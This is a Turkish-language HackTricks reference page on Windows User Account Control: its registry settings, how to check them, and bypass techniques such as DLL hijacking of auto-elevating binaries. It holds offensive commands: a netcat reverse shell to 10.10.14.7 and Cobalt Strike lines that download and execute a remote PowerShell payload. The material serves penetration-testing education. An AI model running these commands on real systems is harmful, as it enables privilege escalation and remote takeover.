# UAC - Kullanıcı Hesabı Denetimi

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Kullanıcı Hesabı Denetimi (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş aktiviteler için onay istemi** sağlayan bir özelliktir. Uygulamalar farklı `bütünlük` seviyelerine sahiptir ve **yüksek seviyeye** sahip bir program, **sistemi tehlikeye atabilecek** görevleri yerine getirebilir. UAC etkinleştirildiğinde, uygulamalar ve görevler her zaman **bir yönetici hesabının güvenlik bağlamında çalışır**; yönetici bu uygulama/görevlerin sisteme yönetici düzeyinde erişim almasına açıkça yetki vermedikçe. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir ancak bir güvenlik sınırı olarak kabul edilmez.

Bütünlük seviyeleri hakkında daha fazla bilgi için:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[bütünlük-seviyeleri.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UAC uygulandığında, bir yönetici kullanıcıya 2 jeton verilir: standart bir kullanıcı anahtarı, normal seviyede düzenli işlemler yapmak için ve bir de yönetici ayrıcalıkları ile.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin nasıl çalıştığını derinlemesine tartışmakta ve oturum açma süreci, kullanıcı deneyimi ve UAC mimarisini içermektedir. Yöneticiler, UAC'nin kendi organizasyonlarına özgü nasıl çalıştığını yerel düzeyde (secpol.msc kullanarak) veya bir Active Directory alan ortamında Grup İlkesi Nesneleri (GPO) aracılığıyla yapılandırıp dağıtmak için güvenlik politikalarını kullanabilirler. Çeşitli ayarlar detaylı olarak [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) tartışılmaktadır. UAC için ayarlanabilecek 10 Grup İlkesi ayarı vardır. Aşağıdaki tablo ek detaylar sağlamaktadır:

| Grup İlkesi Ayarı                                                                                                                                                                                                                                                                                                                                                           | Kayıt Anahtarı              | Varsayılan Ayar                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kullanıcı Hesabı Denetimi: Yerleşik Yönetici hesabı için Yönetici Onay Modu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Devre Dışı                                                  |
| [Kullanıcı Hesabı Denetimi: UIAccess uygulamalarının güvenli masaüstünü kullanmadan yükseltme istemesi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Devre Dışı                                                  |
| [Kullanıcı Hesabı Denetimi: Yönetici Onay Modundaki yöneticiler için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Windows dışı ikili dosyalar için onay istemi               |
| [Kullanıcı Hesabı Denetimi: Standart kullanıcılar için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Güvenli masaüstünde kimlik bilgileri istemi                 |
| [Kullanıcı Hesabı Denetimi: Uygulama kurulumlarını tespit et ve yükseltme istemi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Etkin (ev için varsayılan) Devre Dışı (kurumsal için varsayılan) |
| [Kullanıcı Hesabı Denetimi: Sadece imzalanmış ve doğrulanmış yürütülebilir dosyaları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Devre Dışı                                                  |
| [Kullanıcı Hesabı Denetimi: Sadece güvenli konumlarda kurulu UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Etkin                                                      |
| [Kullanıcı Hesabı Denetimi: Tüm yöneticileri Yönetici Onay Modunda çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Etkin                                                      |
| [Kullanıcı Hesabı Denetimi: Yükseltme istemi sırasında güvenli masaüstüne geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Etkin                                                      |
| [Kullanıcı Hesabı Denetimi: Dosya ve kayıt defteri yazma hatalarını kullanıcıya özel konumlara sanallaştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Etkin                                                      |

### UAC Atlatma Teorisi

Bazı programlar, **kullanıcı yönetici grubuna ait** ise **otomatik olarak yükseltilir**. Bu ikili dosyalar, içlerinde _**Manifests**_ ile _**autoElevate**_ seçeneğine _**True**_ değeri ile sahiptir. İkili dosyanın ayrıca **Microsoft tarafından imzalanması** gerekir.

Sonra, **UAC'yi atlatmak** (orta düzeyden **yüksek** düzeye yükseltmek) için bazı saldırganlar bu tür ikili dosyaları **rastgele kod çalıştırmak** için kullanır çünkü bu, **Yüksek düzeyde bütünlük sürecinden** çalıştırılacaktır.

Bir ikilinin _**Manifest**_ dosyasını, Sysinternals'tan _**sigcheck.exe**_ aracını kullanarak **kontrol edebilirsiniz**. Ve süreçlerin **bütünlük seviyesini** _Process Explorer_ veya _Process Monitor_ (Sysinternals) kullanarak **görebilirsiniz**.

### UAC'yi Kontrol Et

UAC'nin etkin olup olmadığını doğrulamak için:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Eğer **`1`** ise UAC **etkin**, eğer **`0`** ise veya **mevcut değilse**, UAC **etkisiz**dir.

Sonra, **hangi seviye** yapılandırıldığını kontrol edin:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Eğer **`0`** ise, UAC istemi olmayacak (gibi **devre dışı**)
* Eğer **`1`** ise, yönetici **kullanıcı adı ve şifre** istenir yüksek haklarla ikili dosyayı çalıştırmak için (Güvenli Masaüstünde)
* Eğer **`2`** ise (**Her zaman beni bilgilendir**) UAC, yönetici yüksek ayrıcalıklarla bir şey çalıştırmaya çalıştığında her zaman onay isteyecektir (Güvenli Masaüstünde)
* Eğer **`3`** ise `1` gibi ama Güvenli Masaüstünde gerekli değil
* Eğer **`4`** ise `2` gibi ama Güvenli Masaüstünde gerekli değil
* Eğer **`5`** ise (**varsayılan**) yöneticiye yüksek ayrıcalıklarla Windows dışı ikili dosyaları çalıştırmak için onay isteyecektir

Sonra, **`LocalAccountTokenFilterPolicy`** değerine bakmalısınız\
Eğer değer **`0`** ise, yalnızca **RID 500** kullanıcısı (**yerleşik Yönetici**) **UAC olmadan yönetici görevlerini** yerine getirebilir ve eğer `1` ise, **"Yöneticiler"** grubundaki **tüm hesaplar** bunları yapabilir.

Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakmalısınız\
Eğer **`0`** (varsayılan), **yerleşik Yönetici hesabı** uzaktan yönetim görevlerini yapabilir ve eğer **`1`** ise, yerleşik Yönetici hesabı uzaktan yönetim görevlerini **yapamaz**, `LocalAccountTokenFilterPolicy` `1` olarak ayarlanmadıkça.

#### Özet

* Eğer `EnableLUA=0` veya **yoksa**, **hiç kimse için UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=1` , Hiç kimse için UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=0`, RID 500 için UAC yok (Yerleşik Yönetici)**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=1`, Herkes için UAC var**

Tüm bu bilgiler **metasploit** modülü kullanılarak toplanabilir: `post/windows/gather/win_privs`

Kullanıcınızın gruplarını kontrol edebilir ve bütünlük seviyesini alabilirsiniz:
```
net user %username%
whoami /groups | findstr Level
```
## UAC atlatma

{% hint style="info" %}
Kurbanın grafik erişimine sahipseniz, UAC atlatma oldukça basittir çünkü UAS istemi göründüğünde "Evet"e tıklamanız yeterlidir.
{% endhint %}

UAC atlatma, aşağıdaki durumda gereklidir: **UAC etkin, işleminiz orta bütünlük bağlamında çalışıyor ve kullanıcınız yöneticiler grubuna ait.**

UAC'nın **en yüksek güvenlik seviyesinde (Her Zaman) atlatmanın, diğer seviyelerden (Varsayılan) çok daha zor olduğunu** belirtmek önemlidir.

### UAC devre dışı

Eğer UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**) **yönetici ayrıcalıklarıyla bir ters kabuk çalıştırabilirsiniz** (yüksek bütünlük seviyesi) gibi bir şey kullanarak:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC atlatma ile token kopyalama

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "atlatma" (tam dosya sistemi erişimi)

Eğer Administrators grubunda bir kullanıcı ile bir shell'e sahipseniz, **C$** paylaşımını SMB (dosya sistemi) üzerinden yeni bir diske yerel olarak **monte edebilirsiniz** ve **dosya sisteminin içindeki her şeye erişiminiz olur** (hatta Administrator ana klasörüne).

{% hint style="warning" %}
**Bu numaranın artık çalışmadığı görünüyor**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC atlatma cobalt strike ile

Cobalt Strike teknikleri, UAC maksimum güvenlik seviyesinde ayarlanmamışsa yalnızca çalışacaktır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için birkaç modül sunmaktadır.

### KRBUACBypass

Dokümantasyon ve araç [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) adresinde bulunmaktadır.

### UAC bypass exploitleri

[**UACME**](https://github.com/hfiref0x/UACME), birkaç UAC bypass exploitinin **derlemesi**dir. **UACME'yi visual studio veya msbuild kullanarak derlemeniz gerektiğini** unutmayın. Derleme, birkaç çalıştırılabilir dosya (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`) oluşturacaktır, **hangi dosyaya ihtiyacınız olduğunu bilmeniz gerekecek.**\
**Dikkatli olmalısınız** çünkü bazı bypasslar, **kullanıcıya** bir şeylerin olduğunu **bildiren** **diğer programları** **uyarabilir**.

UACME, her tekniğin çalışmaya başladığı **derleme sürümünü** içerir. Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page you get the Windows release `1607` from the build versions.

#### Daha Fazla UAC atlatma

**Burada** AUC'yi atlatmak için kullanılan **tüm** teknikler, **kurbanla** **tam etkileşimli bir kabuk** **gerektirir** (yaygın bir nc.exe kabuğu yeterli değildir).

Bir **meterpreter** oturumu kullanarak elde edebilirsiniz. **Session** değeri **1** olan bir **işleme** geçin:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ çalışmalıdır)

### GUI ile UAC Atlatma

Eğer bir **GUI'ye erişiminiz varsa, UAC istemini aldığınızda sadece kabul edebilirsiniz**, gerçekten bir atlatmaya ihtiyacınız yok. Bu nedenle, bir GUI'ye erişim sağlamak UAC'yi atlatmanıza olanak tanır.

Ayrıca, birinin kullandığı (potansiyel olarak RDP aracılığıyla) bir GUI oturumu alırsanız, **yönetici olarak çalışan bazı araçlar** vardır, buradan **örneğin** **cmd**'yi **yönetici** olarak doğrudan çalıştırabilirsiniz, böylece UAC tarafından tekrar istemde bulunulmaz, [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi. Bu biraz daha **gizli** olabilir.

### Gürültülü brute-force UAC atlatma

Eğer gürültü yapmaktan rahatsız değilseniz, her zaman **şunu çalıştırabilirsiniz**: [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) bu **kullanıcı kabul edene kadar izinleri yükseltmek için istek yapar**.

### Kendi atlatmanız - Temel UAC atlatma metodolojisi

**UACME**'ye bir göz atarsanız, **çoğu UAC atlatmasının bir Dll Hijacking zafiyetini kötüye kullandığını** göreceksiniz (esas olarak kötü niyetli dll'yi _C:\Windows\System32_ içine yazarak). [Dll Hijacking zafiyetini nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking.md).

1. **Otomatik yükseltme** yapacak bir ikili dosya bulun (çalıştırıldığında yüksek bütünlük seviyesinde çalıştığını kontrol edin).
2. Procmon ile **DLL Hijacking**'e karşı savunmasız olabilecek "**NAME NOT FOUND**" olaylarını bulun.
3. Muhtemelen bazı **korumalı yollar** (C:\Windows\System32 gibi) içinde DLL'yi **yazmanız** gerekecek, burada yazma izinleriniz yok. Bunu aşmak için:
   1. **wusa.exe**: Windows 7, 8 ve 8.1. Korumalı yollar içinde bir CAB dosyasının içeriğini çıkarmaya izin verir (çünkü bu araç yüksek bütünlük seviyesinden çalıştırılır).
   2. **IFileOperation**: Windows 10.
4. Korumalı yola DLL'nizi kopyalamak ve savunmasız ve otomatik yükseltilmiş ikili dosyayı çalıştırmak için bir **script** hazırlayın.

### Başka bir UAC atlatma tekniği

Bir **autoElevated ikili dosyanın** **kayıttan** **okumaya** çalışıp çalışmadığını izlemeyi içerir, **çalıştırılacak** bir **ikili dosyanın** veya **komutun** **adı/yolu** (bu bilgi **HKCU** içinde arandığında daha ilginçtir).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
